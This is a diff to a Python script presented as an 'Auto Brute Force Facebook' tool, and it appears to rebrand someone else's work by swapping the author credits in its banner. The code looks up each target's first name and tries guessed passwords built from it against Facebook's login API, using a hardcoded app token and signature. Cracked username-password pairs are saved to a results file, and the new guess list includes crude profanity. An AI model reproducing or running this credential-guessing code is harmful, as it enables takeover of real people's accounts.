@@ -115,7 +115,7 @@ def x(user):
 		pass
 	try:
 		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"01",nama+"86","Suamiku","gaspol","@"+nama+"01","sayang kamu","slanker"]:
+		for pas in [nama+"01",nama+"86","Anjing","mencintaimu","@"+nama+"01","belegug","pejuhh"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
@@ -182,9 +182,9 @@ def banner():
 %s[+]%s====== %sAuto Brute Force Facebook%s ======%s[+]%s
 
 ╭══════════════════════════════════════════╮
-║%s# %sAuthor : %sDulLah%s %s                        ║
-║%s# %sFB     : %sHttps://fb.me/DulahZ%s  %s         ║
-║%s# %sGithub : %sHttps://github.com/unikers71%s%s   ║
+║%s# %sAuthor : %sSoesanto%s %s                        ║
+║%s# %sFB     : %sHttps://fb.me/soesanto%s  %s         ║
+║%s# %sGithub : %sHttps://github.com/M3DPR0%s%s   ║
 ╰══════════════════════════════════════════╯
  """%(R,W,GB,RE,R,W,Y,W,RM,RE,W,Y,W,CM,RE,W,Y,W,PM,RE,W))
 cek()
